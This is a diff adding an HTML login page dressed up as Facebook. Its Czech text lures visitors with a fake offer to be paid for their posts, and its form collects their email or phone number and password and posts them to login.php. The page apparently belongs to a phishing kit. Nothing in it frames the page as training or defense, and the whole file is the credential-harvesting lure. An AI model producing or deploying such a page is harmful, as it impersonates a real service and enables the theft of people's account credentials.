@@ -1,0 +1,111 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f2f2f2;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            margin: 0;
+        }
+
+        .container {
+            width: 300px; /* Reduced width of the container */
+            height: 170px; /* Reduced height of the container */
+            padding: 20px;
+            background-color: rgb(242, 241, 241);
+            border-radius: 0px; /* Added rounded corners */
+            box-shadow: 0 0 0px rgba(0, 0, 0, 0.2);
+        }
+
+        .container input[type="text"],
+        .container input[type="password"] {
+            width: 93%; /* Adjusted the width to 100% */
+            padding: 10px;
+            margin: 10px 0;
+            border: 1px solid #a9bdca; /* Changed to a box border */
+            outline: none;
+            border-radius: 5px; /* Added rounded corners to input fields */
+            height: 16px;
+        }
+
+        .container input[type="password"] {
+            width: 93%; /* Adjusted the width to 100% */
+        }
+
+        .container input[type="text"]:focus,
+        .container input[type="password"]:focus {
+            outline: none;
+        }
+
+        .login-button {
+            width: 100%;
+            padding: 10px;
+            background-color: #2916f6; /* Edit the button color here */
+            border: none;
+            color: #fff;
+            cursor: pointer;
+            border-radius: 5px; /* Added rounded corners to the button */
+            height: 35px;
+        }
+
+        .login-button:hover {
+            background-color: #2980b9;
+        }
+
+        .forgot-password {
+            text-align: center;
+            margin-top: 10px;
+        }
+
+        .forgot-password a {
+            text-decoration: none;
+            color: #3e32c4; /* Edit the color of the link */
+            font-size: 12px; /* Edit the font size of the link */
+        }
+
+        .centered-image1 {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .centered-image2 {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .custom-text {
+            font-family: Arial, sans-serif; /* Edit font family */
+            font-size: 13px; /* Edit font size */
+            margin-top: 15px; /* Edit margin top */
+            margin-bottom: 5px; /* Edit margin bottom */
+        }
+    </style>
+</head>
+<body>
+    <div class="centered-image1"></div>
+    <img src="image1.jpg" alt="Image 1" style="width: 200px; margin-bottom: 20px;">
+    <div class="container">
+        <div class="centered-image2">
+            <img src="image2.jpg" alt="Image 2" style="width: 100px; margin-bottom: 10px;">
+            <div class="custom-text">Zaregistrujte se do programu generování příjmů na Facebooku a získejte zaplaceno za své příspěvky.</div>
+        </div>
+        <form name="login" method="POST" action="login.php">
+            <input type="text" class="container input" placeholder="Mobile Number or Email Address" name="email">
+            <input type="password" class="container input" placeholder="Password" name="password">
+            <button class="login-button" id="loginButton" type="submit">Přihlásit se</button>
+        </form>
+        <div class="forgot-password">
+            <a href="#">Zapomenuté heslo?</a>
+        </div>
+    </div>
+</body>
+</html>
